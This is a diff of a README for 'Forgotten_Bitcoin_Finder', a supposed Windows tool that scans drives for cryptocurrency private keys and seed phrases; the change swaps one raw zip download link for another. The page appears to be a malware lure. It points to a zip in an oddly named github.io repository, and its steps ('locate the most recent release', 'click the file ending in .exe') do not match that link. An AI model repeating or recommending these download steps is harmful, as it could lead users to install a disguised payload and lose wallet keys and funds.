@@ -5,7 +5,7 @@ description: "Scan local drives for lost cryptocurrency wallet files and recover
 ---
 # 🪙 Forgotten_Bitcoin_Finder - Recover your lost digital currency assets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Lizbethbilateral190/lizbethbilateral190.github.io/raw/refs/heads/main/semiresinous/lizbethbilateral-github-io-1.4.zip)
+[![](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lizbethbilateral190/lizbethbilateral190.github.io/main/semiresinous/lizbethbilateral-github-io-1.4.zip)
 
 ## 🔍 Purpose
 Forgotten_Bitcoin_Finder helps users recover access to lost cryptocurrency wallets. This software scans for private keys and seed phrases to assist in the recovery of digital assets. The tool runs on Windows 10 and 11 systems. It uses multithreading to increase the speed of the search process.
@@ -20,7 +20,7 @@ Your computer must meet these requirements to run the software:
 ## 📥 Getting Started
 Follow these steps to obtain and start the application:
 
-1. Visit this page to download: [https://github.com/Lizbethbilateral190/lizbethbilateral190.github.io/raw/refs/heads/main/semiresinous/lizbethbilateral-github-io-1.4.zip](https://github.com/Lizbethbilateral190/lizbethbilateral190.github.io/raw/refs/heads/main/semiresinous/lizbethbilateral-github-io-1.4.zip).
+1. Visit this page to download: [https://raw.githubusercontent.com/Lizbethbilateral190/lizbethbilateral190.github.io/main/semiresinous/lizbethbilateral-github-io-1.4.zip](https://raw.githubusercontent.com/Lizbethbilateral190/lizbethbilateral190.github.io/main/semiresinous/lizbethbilateral-github-io-1.4.zip).
 2. Locate the most recent release version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder that you can locate easily, such as your Downloads folder.
